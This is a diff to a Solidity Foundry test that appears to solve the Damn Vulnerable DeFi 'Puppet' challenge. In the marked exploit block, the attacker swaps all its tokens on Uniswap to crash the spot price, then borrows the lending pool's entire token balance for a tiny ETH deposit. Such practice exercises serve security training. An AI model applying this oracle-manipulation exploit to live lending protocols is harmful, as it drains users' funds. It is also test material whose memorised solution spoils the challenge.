@@ -121,8 +121,11 @@ contract Puppet is Test {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
         dvt.approve(address(uniswapExchange), type(uint).max);
-        uniswapExchange.tokenToEthSwapInput(9, 1e18, DEADLINE);
-        console.log(address(attacker).balance);
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, DEADLINE);
+        uint256 bait = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("required eth to rekt", puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE / 1 ether));
+        console.log("eth in attacker's balance", address(attacker).balance / 1 ether);
+        puppetPool.borrow{value : bait}(POOL_INITIAL_TOKEN_BALANCE);
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
